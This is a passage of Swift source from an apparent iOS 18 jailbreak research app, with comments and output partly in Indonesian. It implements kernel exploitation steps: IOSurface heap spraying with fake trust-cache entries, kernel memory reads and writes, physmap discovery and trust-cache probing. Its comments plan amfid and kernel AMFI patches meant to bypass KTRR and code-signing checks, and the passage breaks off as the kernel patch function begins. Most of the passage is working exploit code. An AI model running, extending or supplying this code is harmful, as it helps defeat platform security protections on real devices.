                        detail += "🎯 MARKER IN GFXMEM at offset 0x\(String(format: "%llx", offset))!\n"
                        gfxMarkerFound = true
                        break
                    }
                }
                
                if !gfxMarkerFound {
                    detail += "No markers in GfxMem (expected — different physical region)\n"
                }
            }
            
            RootExecutor.rcall(sb, "IOSurfaceUnlock", gfxSurface, 0, 0)
        }
        
        // --- Phase 6: Aggressive spray — try to get adjacent to pmap_cs ---
        detail += "\nPhase 6: Targeted spray near pmap_cs zone...\n"
        
        // We know pmap_cs_allow_invalid is readable via socket KRW
        // If we spray enough, some allocations might land near it
        // Then we can use KRW to verify and potentially write trust cache entries
        
        // Read current pmap_cs value
        let pmapCSAddr = ds_get_our_proc() + 0x300  // approximate offset to pmap_cs
        let pmapCSVal = ds_kread64(pmapCSAddr)
        detail += "pmap_cs region value: 0x\(String(format: "%llx", pmapCSVal))\n"
        
        // Do a second spray round — this time with trust-cache-shaped data
        // Trust cache entry: [cdhash(20 bytes)] [hashType(1)] [flags(1)]
        // Total: 22 bytes, padded to 32 in kalloc.32
        
        detail += "\nSpraying trust-cache-shaped entries...\n"
        
        // Fake CDHash for /usr/bin/id (we'll verify if it works)
        // CDHash is SHA-256 of CodeDirectory, truncated to 20 bytes
        let fakeCDHash: [UInt8] = [
            0x41, 0x42, 0x43, 0x44, 0x45, 0x46, 0x47, 0x48,
            0x49, 0x4A, 0x4B, 0x4C, 0x4D, 0x4E, 0x4F, 0x50,
            0x51, 0x52, 0x53, 0x54  // 20 bytes
        ]
        
        // Write trust-cache-shaped data to spray buffer
        let tcEntryAddr = mem + 0x3A00
        // CDHash (20 bytes)
        for i in 0..<20 {
            sb[tcEntryAddr + UInt64(i)].setValue8(fakeCDHash[i])
        }
        // hashType = 2 (SHA256)
        sb[tcEntryAddr + 20].setValue8(2)
        // flags = 0
        sb[tcEntryAddr + 21].setValue8(0)
        // Padding
        for i in 22..<32 {
            sb[tcEntryAddr + UInt64(i)].setValue8(0)
        }
        
        // Spray 512 more entries with trust-cache shape
        let tcSprayCount = 512
        var tcSprayed = 0
        
        for i in 0..<tcSprayCount {
            let nsData = remote_msg(sb, nsDataClass, dataWithBytes, tcEntryAddr, 32, 0, 0)
            if nsData != 0 {
                let keyStr = remote_NSString(sb, "tc_\(String(format: "%04d", i))")
                RootExecutor.rcall(sb, "IOSurfaceSetValue", spraySurface, keyStr, nsData)
                tcSprayed += 1
            }
            
            if i % 128 == 127 {
                RootExecutor.rcall(sb, "usleep", 500)
            }
        }
        
        detail += "Sprayed \(tcSprayed) trust-cache-shaped entries\n"
        
        // --- Phase 7: Verify spray via KRW scan ---
        detail += "\nPhase 7: Post-spray KRW scan...\n"
        
        // Scan again around proc for our markers
        var postSprayFound = false
        var postScanCount = 0
        
        for offset in stride(from: UInt64(0), to: scanRange, by: 32) {
            let addr = scanBase + offset
            let val = ds_kread64_safe(addr)
            postScanCount += 1
            
            // Check for marker pattern
            if val == marker {
                detail += "🎯 POST-SPRAY: Marker at 0x\(String(format: "%llx", addr))!\n"
                postSprayFound = true
                
                // Read the full 32-byte entry
                let v1 = ds_kread64_safe(addr)
                let v2 = ds_kread64_safe(addr + 8)
                let v3 = ds_kread64_safe(addr + 16)
                let v4 = ds_kread64_safe(addr + 24)
                detail += "  [0x\(String(format: "%016llx", v1)) 0x\(String(format: "%016llx", v2))"
                detail += " 0x\(String(format: "%016llx", v3)) 0x\(String(format: "%016llx", v4))]\n"
                break
            }
            
            // Check for trust-cache-shaped data (starts with 0x41424344...)
            if val == 0x4847464544434241 {  // "ABCDEFGH" in little-endian
                detail += "🎯 TRUST CACHE SHAPE FOUND at 0x\(String(format: "%llx", addr))!\n"
                postSprayFound = true
                markerAddr = addr
                
                // This means our spray landed in KRW-accessible zone!
                // We can now WRITE a real CDHash here!
                detail += "\n⚡⚡⚡ SPRAY LANDED IN KRW ZONE! ⚡⚡⚡\n"
                detail += "We can write arbitrary trust cache entries!\n"
                detail += "Next: compute real CDHash → write → spawn!\n"
                break
            }
            
            if postScanCount > 1024 {
                break
            }
        }
        
        if !postSprayFound {
            detail += "No spray data found in KRW zone (\(postScanCount) reads)\n"
            detail += "\nConclusion: Spray lands in different kalloc zone than proc/pmap_cs\n"
            detail += "The kernel heap zones are isolated — spray cannot reach trust cache\n"
            detail += "\nPossible next steps:\n"
            detail += "1. Try larger allocations (kalloc.64, kalloc.128)\n"
            detail += "2. Spray from different process (launchd vs SpringBoard)\n"
            detail += "3. Use IOSurface property spray + physical scan\n"
            detail += "4. Try zone garbage collection to force zone merging\n"
        }
        
        // Cleanup: remove spray properties
        detail += "\nCleanup: removing spray properties...\n"
        if ioSurfaceRemoveValue != 0 {
            for i in stride(from: 1, to: sprayCount, by: 2) {
                let keyStr = remote_NSString(sb, "spray_\(String(format: "%03d", i))")
                RootExecutor.rcall(sb, "IOSurfaceRemoveValue", spraySurface, keyStr)
            }
            for i in 0..<tcSprayCount {
                let keyStr = remote_NSString(sb, "tc_\(String(format: "%04d", i))")
                RootExecutor.rcall(sb, "IOSurfaceRemoveValue", spraySurface, keyStr)
            }
        }
        detail += "Done.\n"
        
        let success = postSprayFound || markerFound
        return ExperimentResult(name: "Heap Spray (Exp 73)", success: success, detail: detail, timestamp: Date())
    }
    
    // MARK: - Experiment 74: Physmap Direct Access
    
    /// The kernel maintains a 1:1 virtual mapping of ALL physical RAM (physmap).
    /// Formula: physmap_virt = physmap_base + physical_address
    /// If we can find physmap_base, we can read/write ANY physical address
    /// through the kernel's own virtual mapping — bypassing zone isolation!
    ///
    /// Key insight: physmap is in kernel __DATA region, NOT in a PPL-protected zone.
    /// Our socket KRW might be able to read it IF the address falls in our zone.
    /// Alternative: use the known gPhysBase/gVirtBase to calculate.
    ///
    /// On A12 iOS 18.2:
    ///   physmap_base ≈ 0xfffffff000000000 (gVirtBase) - 0x800000000 (gPhysBase) + kernel_base
    ///   OR: physmap is at a fixed offset from kernel base
    /// Pure KRW — no launchd RC, no IOKit/IOSurface (prevents initproc panic).
    private func expPhysmapAccess() -> ExperimentResult {
        var detail = "Experiment 74: Physmap Direct Access (KRW-only, safe)\n"
        detail += "====================================================\n\n"

        // Sudah verified (screenshot lama / run sukses) — jangan ulang probe yang bikin panic/respring
        if PhysmapConstants.isVerified, let saved = PhysmapConstants.load() {
            let kernBase = ds_get_kernel_base()
            let magic = ds_kread64_safe(kernBase)
            let machOk = (magic & 0xFFFFFFFF) == 0xFEEDFACF
            detail += "✅ Sudah verified sebelumnya — skip probe ulang\n"
            detail += "gVirtBase: 0x\(String(format: "%llx", saved.gVirtBase))\n"
            detail += "gPhysBase: 0x\(String(format: "%llx", saved.gPhysBase))\n"
            detail += "KRW __TEXT sekarang: \(machOk ? "OK (0xFEEDFACF)" : "⚠️ cek jailbreak")\n\n"
            detail += "→ Fokus berikutnya: ② Trust Cache Probe (Exp 77)\n"
            detail += "Jangan tap ③ Inject sampai ② hijau.\n"
            return ExperimentResult(name: "Physmap Access (Exp 74)", success: machOk, detail: detail, timestamp: Date())
        }

        let kernBase = ds_get_kernel_base()
        let kernSlide = ds_get_kernel_slide()
        detail += "Kernel base: 0x\(String(format: "%llx", kernBase))\n"
        detail += "Kernel slide: 0x\(String(format: "%llx", kernSlide))\n\n"

        let gPhysBase: UInt64 = PhysmapConstants.defaultGPhysBase
        let ourProc = ds_get_our_proc()
        let zoneMapEst = PhysmapConstants.estimateZoneMapBase(ourProc: ourProc)
        detail += "proc: 0x\(String(format: "%llx", ourProc))\n"
        detail += "Zone map (est): 0x\(String(format: "%llx", zoneMapEst))\n"
        detail += "gPhysBase: 0x\(String(format: "%llx", gPhysBase))\n\n"

        // Step 2: Test if socket KRW can read OUTSIDE proc/task zone
        // Key question: is our KRW truly zone-limited, or can it read any kernel VA?
        // Test by reading kernel __TEXT header (Mach-O magic) — different zone from proc
        
        detail += "\n=== Testing KRW zone boundaries ===\n"
        
        // Read kernel Mach-O header (should be 0xFEEDFACF for 64-bit)
        let kernMagic = ds_kread64_safe(kernBase)
        detail += "Kernel base read: 0x\(String(format: "%llx", kernMagic))\n"
        
        let isMachO = (kernMagic & 0xFFFFFFFF) == 0xFEEDFACF
        if isMachO {
            detail += "✅ Kernel Mach-O header readable! (0xFEEDFACF)\n"
            detail += "KRW can read __TEXT segment!\n\n"
        } else if kernMagic == 0 {
            detail += "❌ Kernel base returns 0 — zone-blocked\n\n"
        } else {
            detail += "⚠️ Unexpected value — might be slid or different format\n\n"
        }
        
        // ============================================================
        // PRIMARY: kernproc pmap → tte/ttep (+0x00 or +0x08, PAC stripped)
        // User pmap (our_proc) often has tte=0 at +0x00 — see prior experiments.
        // ============================================================
        var foundPhysBase: UInt64 = 0
        var foundVirtBase: UInt64 = 0

        if let verified = verifyPhysmapSafe(
            kernBase: kernBase,
            kernMagic: kernMagic,
            ourProc: ourProc,
            tte: 0,
            detail: &detail
        ) {
            foundVirtBase = verified.gVirtBase
            foundPhysBase = verified.gPhysBase
        }

        let success = foundPhysBase != 0 && foundVirtBase != 0
        return ExperimentResult(name: "Physmap Access (Exp 74)", success: success, detail: detail, timestamp: Date())
    }
    
    // MARK: - Experiment 77: Trust Cache Probe (safe) + Inject (physmap)

    /// Fast kernelcache-guided probe: symtab → few __DATA slots → optional short fallback.
    private func expTrustCacheProbeSafe() -> ExperimentResult {
        let expName = "Trust Cache Probe (Exp 77)"
        var detail = "Experiment 77: Trust Cache Probe (read-only, KRW-safe)\n"
        detail += "====================================================\n\n"
        detail += "Mode: offline kernelcache ADRP + KRW aman (analyze_kernelcache.py di device)\n\n"

        guard PhysmapConstants.isVerified else {
            detail += "❌ Jalankan Physmap Access (Exp 74) dulu.\n"
            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
        }

        PhysmapConstants.clearProbeOK()

        let physmap = PhysmapConstants.loadOrDefault()
        let kernBase = ds_get_kernel_base()
        let kernSlide = ds_get_kernel_slide()
        detail += "gVirtBase: 0x\(String(format: "%llx", physmap.gVirtBase)) (saved)\n"
        detail += "gPhysBase: 0x\(String(format: "%llx", physmap.gPhysBase))\n"
        detail += "Kernel base: 0x\(String(format: "%llx", kernBase))\n"
        detail += "Kernel slide: 0x\(String(format: "%llx", kernSlide))\n\n"

        let fileDataOffForBase = ds_kcache_analyze_data_offset()
        let dataOff = fileDataOffForBase != 0 ? fileDataOffForBase : PhysmapConstants.dataOffsetFromText
        let dataSegBase = kernBase &+ dataOff
        let pplDataBase = dataSegBase &+ PhysmapConstants.pplDataOffsetFromData
        detail += "__DATA: 0x\(String(format: "%llx", dataSegBase))\n"
        detail += "__DATA.__ppl_data: 0x\(String(format: "%llx", pplDataBase)) (TIDAK dibaca — PPL panic)\n"

        let offlineSlotCount = ds_kcache_trust_slot_count()
        let fileDataOff = fileDataOffForBase
        detail += "\n=== Offline kernelcache scan ===\n"
        detail += "  ADRP slots: \(offlineSlotCount) (dari file Documents/kernelcache)\n"
        if fileDataOff != 0 {
            detail += "  dataOffsetFromText: 0x\(String(format: "%llx", fileDataOff))"
            if fileDataOff != PhysmapConstants.dataOffsetFromText {
                detail += " (builtin 0x\(String(format: "%llx", PhysmapConstants.dataOffsetFromText)))"
            }
            detail += "\n"
        }
        if offlineSlotCount == 0 {
            detail += "  ⚠️ Jalankan Import/Verifikasi kernelcache dulu (Settings).\n"
        }
        detail += "\n"

        var probeOffsets: [UInt64] = []
        if offlineSlotCount > 0 {
            for i in 0..<offlineSlotCount {
                let off = ds_kcache_trust_slot_at(i)
                if off != 0 { probeOffsets.append(off) }
            }
        }
        if probeOffsets.isEmpty {
            probeOffsets = PhysmapConstants.trustCacheFastOffsetsInData
        }

        var tcStructAddr: UInt64 = 0
        var tcEntryCount: UInt64 = 0
        var krwBudget = 512

        func spendKRW() -> Bool {
            if krwBudget <= 0 { return false }
            krwBudget -= 1
            return true
        }

        func readU32(_ va: UInt64) -> UInt32 {
            if isSafeKernelHeapKreadAddress(va) { return safeKread32Heap(va) }
            return safeKread32Kernel(va)
        }

        func trustCacheHeaderAt(_ va: UInt64, headerOff: UInt64 = 0) -> (UInt32, UInt32)? {
            guard spendKRW(),
                  isSafeTrustCacheStructVA(va, dataSegBase: dataSegBase, pplDataBase: pplDataBase, kernTextBase: kernBase)
            else { return nil }
            let base = va &+ headerOff
            let ver = readU32(base)
            let cnt = readU32(base + 4)
            // count >= 5: trust cache sistem selalu punya banyak entry
            // count < 5 = false positive (struct lain yang kebetulan lolos)
            guard cnt >= 5 && cnt < 500_000 else { return nil }
            if ver >= 1 && ver <= 16 { return (ver, cnt) }
            return nil
        }

        func tryTrustCacheAt(_ val: UInt64, label: String) -> Bool {
            for hdrOff: UInt64 in [0, 8, 0x10, 0x18, 0x20] {
                if let (tcVer, tcCnt) = trustCacheHeaderAt(val, headerOff: hdrOff) {
                    let hdrVA = val &+ hdrOff
                    guard trustCacheEntriesPlausible(
                        hdrVA: hdrVA, count: tcCnt,
                        dataSegBase: dataSegBase, pplDataBase: pplDataBase, kernTextBase: kernBase
                    ) else {
                        detail += "  (abaikan \(label)+0x\(String(format: "%x", hdrOff)): ver=\(tcVer) cnt=\(tcCnt) — entry[0] bukan CDHash)\n"
                        continue
                    }
                    let kind = isSafeKernelHeapKreadAddress(val) ? "heap" : "__DATA"
                    detail += "🎯 Trust cache \(label) (\(kind))!\n"
                    detail += "  addr: 0x\(String(format: "%llx", hdrVA))\n"
                    detail += "  version: \(tcVer), count: \(tcCnt)\n"
                    tcStructAddr = hdrVA
                    tcEntryCount = UInt64(tcCnt)
                    return true
                }
            }
            guard isLikelyKernelObjectPointer(val),
                  isSafeTrustCacheFollowPointer(val, dataSegBase: dataSegBase, pplDataBase: pplDataBase, kernTextBase: kernBase)
                || isLikelyTrustCacheHeapPointer(val, kernTextBase: kernBase)
            else { return false }
            guard spendKRW() else { return false }
            let inner = ds_kreadptr(val)
            guard inner != 0, inner != val, isLikelyKernelObjectPointer(inner),
                  isSafeTrustCacheFollowPointer(inner, dataSegBase: dataSegBase, pplDataBase: pplDataBase, kernTextBase: kernBase)
            else { return false }
            return tryTrustCacheAt(inner, label: "\(label)→deref")
        }

        func probeGlobalSlot(_ off: UInt64, label: String) {
            let addr = dataSegBase &+ off
            guard isSafeTrustCacheStructVA(addr, dataSegBase: dataSegBase, pplDataBase: pplDataBase, kernTextBase: kernBase)
            else { return }
            if off != PhysmapConstants.pmapCsAllowInvalidOffsetInData {
                if tryTrustCacheAt(addr, label: "\(label)@inline") { return }
            }
            guard spendKRW() else { return }
            let raw = safeKread64Kernel(addr)
            let val = ds_kreadptr(addr)
            let use = val != 0 ? val : raw
            guard isLikelyKernelObjectPointer(use) else { return }
            if tryTrustCacheAt(use, label: label) { return }
            if isSafeTrustCacheFollowPointer(use, dataSegBase: dataSegBase, pplDataBase: pplDataBase, kernTextBase: kernBase),
               spendKRW() {
                let smr = ds_kreadsmrptr(addr)
                if smr != 0, smr != use, isLikelyKernelObjectPointer(smr) {
                    _ = tryTrustCacheAt(smr, label: "\(label)→smr")
                }
            }
        }

        detail += "=== Symtab / XPF globals ===\n"
        let symProbeNames = [
            "_trustcache",
            "_static_trust_cache",
            "_loaded_trust_caches",
            "kernelSymbol.trust_cache",
        ]
        for sym in symProbeNames {
            var rt = ds_kcache_symbol_runtime(sym)
            if rt == 0 { rt = ds_xpf_resolve_runtime(sym) }
            if rt == 0 {
                detail += "  \(sym): (not found)\n"
                continue
            }
            detail += "  \(sym): 0x\(String(format: "%llx", rt))\n"
            if tryTrustCacheAt(rt, label: sym) { break }
            if spendKRW() {
                let p = ds_kreadptr(rt)
                if isLikelyKernelObjectPointer(p) {
                    if tryTrustCacheAt(p, label: "\(sym)→ptr") { break }
                }
            }
        }
        detail += "\n"

        var orderedOffsets = probeOffsets
        // Prioritas berdasarkan analisis offline (analyze_kernelcache.py --deep-probe):
        // 0x39b0 dan 0x38a0 = slot yang di-STR oleh kode kernel (trust_cache_init area)
        // 0x3980, 0x3920, 0x3930 = ADRP refs tinggi dari AMFI code
        let priority: [UInt64] = [
            0x39b0, 0x38a0,           // ← STR target dari kernel init code (highest priority)
            0x3980, 0x3920, 0x3930,   // ← ADRP refs tinggi
            0x38e0, 0x38c0, 0x38b0, 0x3900,
            0x2d0, 0x1a4, 0x2770, 0x1f8,
        ]
        orderedOffsets.sort { a, b in
            let pa = priority.firstIndex(of: a) ?? 999
            let pb = priority.firstIndex(of: b) ?? 999
            if pa != pb { return pa < pb }
            return a < b
        }
        orderedOffsets.removeAll { $0 == PhysmapConstants.pmapCsAllowInvalidOffsetInData }

        detail += "=== Probe __DATA (\(orderedOffsets.count) slot, pre-PPL) ===\n"
        for off in orderedOffsets {
            probeGlobalSlot(off, label: "kc+0x\(String(format: "%x", off))")
            if tcStructAddr != 0 { break }
        }

        if tcStructAddr == 0 {
            detail += "\n=== Pointer di global __DATA (read-only) ===\n"
            for off in probeOffsets.prefix(8) {
                let addr = dataSegBase &+ off
                guard isSafeTrustCacheStructVA(addr, dataSegBase: dataSegBase, pplDataBase: pplDataBase, kernTextBase: kernBase) else { continue }
                let p = ds_kreadptr(addr)
                let raw = safeKread64Kernel(addr)
                let show = p != 0 ? p : raw
                var tag: String
                if show == 0 { tag = "null" }
                else if isSafeKernelHeapKreadAddress(show) { tag = "heap?" }
                else if show >= dataSegBase && show < pplDataBase { tag = "__DATA" }
                else if isFilesetAuxDataVA(show, kernTextBase: kernBase, dataSegBase: dataSegBase) { tag = "fileset aux" }
                else if show >= kernBase && show < dataSegBase { tag = "__TEXT? (skip)" }
                else { tag = "?" }
                if p == 0 && raw != 0 { tag += " raw" }
                detail += "  kc+0x\(String(format: "%x", off)): 0x\(String(format: "%llx", show)) (\(tag))\n"
            }
        }

        if tcStructAddr == 0 {
            detail += "\n=== Scan fileset aux (pointer dari slot) ===\n"
            var auxSeen = Set<UInt64>()
            for off in orderedOffsets.prefix(16) {
                let addr = dataSegBase &+ off
                guard spendKRW() else { break }
                let p = ds_kreadptr(addr)
                guard isLikelyKernelObjectPointer(p),
                      isFilesetAuxDataVA(p, kernTextBase: kernBase, dataSegBase: dataSegBase),
                      auxSeen.insert(p).inserted
                else { continue }
                detail += "  follow aux 0x\(String(format: "%llx", p))\n"
                if tryTrustCacheAt(p, label: "aux") { break }
            }
        }

        // === Heap deep scan: ikuti pointer dari __DATA ke heap, lalu scan +0..+0x80 ===
        // Trust cache iOS 18 sering ada di heap (kalloc), bukan inline __DATA.
        // Pointer di __DATA → heap object → trust cache struct di dalam object itu.
        if tcStructAddr == 0 {
            detail += "\n=== Heap deep scan (pointer __DATA → heap object) ===\n"
            var heapSeen = Set<UInt64>()
            for off in orderedOffsets.prefix(24) {
                guard tcStructAddr == 0 else { break }
                let addr = dataSegBase &+ off
                guard spendKRW() else { break }
                let p = ds_kreadptr(addr)
                guard isLikelyKernelObjectPointer(p),
                      isSafeKernelHeapKreadAddress(p),
                      heapSeen.insert(p).inserted
                else { continue }
                // Scan +0x00..+0x80 dari heap object untuk cari trust cache header
                for innerOff: UInt64 in [0, 8, 0x10, 0x18, 0x20, 0x28, 0x30, 0x40, 0x48, 0x50, 0x60, 0x70, 0x80] {
                    guard spendKRW() else { break }
                    let candidate = p &+ innerOff
                    guard isSafeKernelHeapKreadAddress(candidate) else { continue }
                    if tryTrustCacheAt(candidate, label: "heap+0x\(String(format: "%x", innerOff))@kc+0x\(String(format: "%x", off))") {
                        break
                    }
                    // Juga ikuti pointer di dalam heap object
                    let inner = ds_kreadptr(candidate)
                    guard isLikelyKernelObjectPointer(inner),
                          isSafeKernelHeapKreadAddress(inner),
                          inner != p
                    else { continue }
                    if tryTrustCacheAt(inner, label: "heap→inner@kc+0x\(String(format: "%x", off))") { break }
                }
            }
        }

        guard tcStructAddr != 0 else {
            detail += "\n❌ Struct trust cache tidak ditemukan.\n"
            detail += "Kernelcache OK (\(offlineSlotCount) slot). Perbaikan band KRW 0xffffff80… aktif.\n"
            detail += "Jika masih gagal: Import ulang kernelcache + Jailbreak, kirim log slot di atas.\n"
            detail += "Jangan tap ③ Inject.\n"
            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
        }

        func tcRead64(_ va: UInt64) -> UInt64 {
            isSafeKernelHeapKreadAddress(tcStructAddr) ? safeKread64Heap(va) : safeKread64Kernel(va)
        }
        func tcRead32(_ va: UInt64) -> UInt32 {
            isSafeKernelHeapKreadAddress(tcStructAddr) ? safeKread32Heap(va) : safeKread32Kernel(va)
        }

        // === Raw struct dump (64 bytes) — untuk diagnosa layout iOS 18 ===
        if isSafeTrustCacheStructVA(tcStructAddr, dataSegBase: dataSegBase, pplDataBase: pplDataBase, kernTextBase: kernBase) {
            detail += "\n=== Raw struct dump (64 bytes dari tcStructAddr) ===\n"
            for dumpOff in stride(from: UInt64(0), to: 64, by: 8) {
                let dumpVA = tcStructAddr &+ dumpOff
                guard isSafeTrustCacheStructVA(dumpVA, dataSegBase: dataSegBase, pplDataBase: pplDataBase, kernTextBase: kernBase) else { break }
                let val = tcRead64(dumpVA)
                detail += "  +0x\(String(format: "%02x", dumpOff)): 0x\(String(format: "%016llx", val))\n"
            }
            detail += "\n"
        }

        // === Sample entries (KRW, max 3) — coba berbagai stride ===
        if isSafeTrustCacheStructVA(tcStructAddr, dataSegBase: dataSegBase, pplDataBase: pplDataBase, kernTextBase: kernBase),
           tcEntryCount > 0 {
            detail += "=== Sample entries (KRW, max 3) ===\n"
            // iOS 18 trust cache entry: kemungkinan 24 bytes (CDHash 20B + hashType 1B + flags 1B + pad 2B)
            // atau 32 bytes. Coba stride 24 dan 32.
            for stride in [UInt64(24), UInt64(32), UInt64(22)] {
                let entriesStart = tcStructAddr &+ 8
                guard isSafeTrustCacheStructVA(entriesStart, dataSegBase: dataSegBase, pplDataBase: pplDataBase, kernTextBase: kernBase) else { break }
                detail += "  [stride=\(stride)]:\n"
                for i in 0..<min(3, Int(tcEntryCount)) {
                    let entryAddr = entriesStart &+ UInt64(i) * stride
                    guard isSafeTrustCacheStructVA(entryAddr &+ 16, dataSegBase: dataSegBase, pplDataBase: pplDataBase, kernTextBase: kernBase) else { break }
                    let h0 = tcRead64(entryAddr)
                    let h1 = tcRead64(entryAddr &+ 8)
                    let h2 = tcRead32(entryAddr &+ 16)
                    detail += "    [\(i)] 0x\(String(format: "%016llx", h0)) 0x\(String(format: "%016llx", h1)) 0x\(String(format: "%08x", h2))\n"
                }
            }
        }

        detail += "\n✅ PROBE OK — trust cache ditemukan (tanpa physmap read).\n"
        detail += "Lanjut ke ③ Write Test untuk verifikasi apakah __DATA bisa ditulis via KRW.\n"
        PhysmapConstants.markProbeOK()

        // Simpan hasil probe ke state untuk dipakai Exp 79
        let savedAddr = tcStructAddr
        let savedCount = UInt32(tcEntryCount)
        DispatchQueue.main.async {
            self.probedTCAddr = savedAddr
            self.probedTCCount = savedCount
            self.probedTCStride = 24  // default; update jika stride 32 terbukti lebih baik
        }

        return ExperimentResult(name: expName, success: true, detail: detail, timestamp: Date())
    }

    // MARK: - Exp 81: Heap TC Analysis
    
    private func expHeapTCAnalysis() -> ExperimentResult {
        let expName = "Heap TC Analysis (Exp 81)"
        var detail = "Experiment 81: Heap Pointer Analysis\n"
        detail += "=====================================\n\n"

        guard PhysmapConstants.isVerified else {
            return ExperimentResult(name: expName, success: false, detail: "Jalankan Physmap Access (Exp 74) dulu.", timestamp: Date())
        }

        let kernBase = ds_get_kernel_base()
        let dataOff = ds_kcache_analyze_data_offset() != 0 ? ds_kcache_analyze_data_offset() : PhysmapConstants.dataOffsetFromText
        let dataSegBase = kernBase &+ dataOff
        
        detail += "Kernel base: 0x\(String(format: "%llx", kernBase))\n"
        detail += "__DATA base: 0x\(String(format: "%llx", dataSegBase))\n\n"

        let targetOffsets: [UInt64] = [0x39b0, 0x38a0]
        var foundHeapStructs = 0
        
        for off in targetOffsets {
            let addr = dataSegBase &+ off
            // Read pointer
            let ptr = ds_kreadptr(addr)
            detail += "kc+0x\(String(format: "%x", off)) (0x\(String(format: "%llx", addr))):\n"
            detail += "  -> 0x\(String(format: "%llx", ptr))\n"
            
            if isSafeKernelHeapKreadAddress(ptr) {
                detail += "  ✅ Pointer menunjuk ke Heap!\n"
                // Analyze what is at the heap pointer
                let ver = safeKread32Heap(ptr)
                let cnt = safeKread32Heap(ptr &+ 4)
                let nextPtr = safeKread64Heap(ptr &+ 0x10)
                
                detail += "  Header [ver=\(ver), cnt=\(cnt)]\n"
                detail += "  Next ptr: 0x\(String(format: "%llx", nextPtr))\n"
                
                if (ver >= 1 && ver <= 16) || (cnt >= 1 && cnt <= 500_000) {
                    detail += "  🎯 Ini kemungkinan besar Trust Cache struct di Heap!\n"
                    foundHeapStructs += 1
                    
                    detail += "\n  Coba Write Test di Heap struct (+0x18 UUID field)...\n"
                    let testAddr = ptr &+ 0x18
                    let original = safeKread64Heap(testAddr)
                    let sentinel: UInt64 = 0xdeadbeefcafebabe
                    
                    ds_kwrite64(testAddr, sentinel)
                    let verify = safeKread64Heap(testAddr)
                    if verify == sentinel {
                        detail += "  ✅ Write Test SUKSES! (KTRR tidak memblokir Heap)\n"
                        // Restore
                        ds_kwrite64(testAddr, original)
                    } else {
                        detail += "  ❌ Write Test GAGAL! (Nilai tidak berubah)\n"
                    }
                } else {
                    detail += "  ⚠️ Header tidak cocok dengan trust cache.\n"
                }
            } else if ptr == 0 {
                detail += "  ⚠️ Nilai 0. (Belum ada dynamic trust cache yang diload)\n"
            } else {
                detail += "  ⚠️ Bukan pointer heap (kemungkinan __DATA atau mati).\n"
            }
            detail += "\n"
        }
        
        detail += "KESIMPULAN:\n"
        if foundHeapStructs > 0 {
            detail += "Berhasil menemukan Heap Trust Cache. Injeksi via KRW bisa dilakukan tanpa KTRR panic!\n"
        } else {
            detail += "Tidak ada Heap Trust Cache yang aktif. Pancing dengan mount Developer Disk Image / aplikasi lain.\n"
        }
        
        return ExperimentResult(name: expName, success: foundHeapStructs > 0, detail: detail, timestamp: Date())
    }

    // MARK: - Exp 82: Deep Trust Cache Scan
    
    private func runExp82DeepTCScan() {
        isRunning = true
        runningLabel = "Deep TC Scan"
        guard mgr.dsready, PhysmapConstants.isVerified else {
            isRunning = false
            runningLabel = ""
            return
        }
        DispatchQueue.global(qos: .userInitiated).async {
            let result = self.expDeepTCScan()
            DispatchQueue.main.async {
                self.results.insert(result, at: 0)
                self.isRunning = false
                self.runningLabel = ""
            }
        }
    }

    // MARK: - Exp 83: CS Flags Bypass via Physmap

    /// Exp 83: Modifikasi cs_flags di proc_ro binary target via physmap VA.
    /// Physmap bypass KTRR karena physmap adalah mapping berbeda dari physical memory yang sama.
    /// Tidak perlu RC/launchd — pure KRW.
    private func runExp83CSFlagsBypass() {
        isRunning = true
        runningLabel = "CS Flags"
        guard mgr.dsready, PhysmapConstants.isVerified else {
            isRunning = false
            runningLabel = ""
            return
        }
        DispatchQueue.global(qos: .userInitiated).async {
            let result = self.expCSFlagsBypass(targetBinary: self.customBinary)
            DispatchQueue.main.async {
                self.results.insert(result, at: 0)
                self.isRunning = false
                self.runningLabel = ""
            }
        }
    }

    // MARK: - Exp 84: amfid Patch via Physmap

    /// Exp 84 v2: Patch amfid via launchd RC + task_for_pid.
    /// Hardcoded offsets dari on-device analysis (Dump amfid).
    /// Semua 13 BL+CBNZ W0 mengarah ke fungsi yang sama (0x10001c830) = signature check.
    /// Patch: NOP semua CBNZ W0 → amfid selalu lanjut (skip error branch).
    private func runExp84AmfidPatch() {
        isRunning = true
        runningLabel = "amfid"
        guard mgr.rcready else {
            isRunning = false
            runningLabel = ""
            return
        }

        #if !DISABLE_REMOTECALL
        root.executeAsRoot(operation: "exp84_amfid_patch") { rc in
            let result = self.expAmfidPatchV2(rc: rc)
            DispatchQueue.main.async {
                self.results.insert(result, at: 0)
                self.isRunning = false
                self.runningLabel = ""
            }
            return (result.success, result.detail.prefix(80).description, 0)
        }
        #else
        isRunning = false
        runningLabel = ""
        #endif
    }

    // MARK: - Exp 85: Kernel AMFI Patch via Physmap

    /// Exp 85: Patch kernel AMFI function langsung via physmap.
    /// Tidak perlu page table walk — kernel VA langsung convert ke physmap VA.
    /// Formula: physmapVA = kernVA - gVirtBase + gPhysBase
    /// Target: hot function yang dipanggil 19x (signature check utama).
    private func runExp85KernelAmfiPatch() {
        isRunning = true
        runningLabel = "Kern AMFI"
        guard mgr.dsready, PhysmapConstants.isVerified else {
            isRunning = false
            runningLabel = ""
            return
        }
        DispatchQueue.global(qos: .userInitiated).async {
            let result = self.expKernelAmfiPatch()
            DispatchQueue.main.async {
                self.results.insert(result, at: 0)
                self.isRunning = false
                self.runningLabel = ""
            }
        }
    }

    /// Exp 85: Patch kernel AMFI signature check function via physmap write.
    ///
    /// Dari kernelcache analysis (find_amfi_kernel_patch.py):
    ///   - __TEXT_EXEC base (unslid): 0xfffffff007d90000
    ///   - Hot function +0x2ed54: dipanggil 19x (signature check utama)
    ///   - Hot function +0xd9508: dipanggil 15x
    ///   - Prologue: 0xd503237f (PACIBSP)
    ///
    /// Patch: MOV W0, #0 (0x52800000) + RET (0xD65F03C0) di prologue
    /// → fungsi selalu return 0 (allow) → AMFI skip signature check
    ///
    /// Kenapa ini bisa bypass KTRR:
    ///   - KTRR protect kernel VA mapping (0xfffffff0...)
    ///   - Physmap adalah BERBEDA VA mapping ke physical memory yang sama
    ///   - Write via physmap VA MUNGKIN bypass KTRR (tergantung AMCC config)
    ///   - Exp 79 gagal write ke __DATA via KRW langsung (bukan physmap)
    ///   - Physmap write ke heap BERHASIL (Exp 81) — heap bukan KTRR
    ///   - __TEXT_EXEC mungkin punya proteksi berbeda dari __DATA
    private func expKernelAmfiPatch() -> ExperimentResult {
        let expName = "Kernel AMFI Patch (Exp 85)"
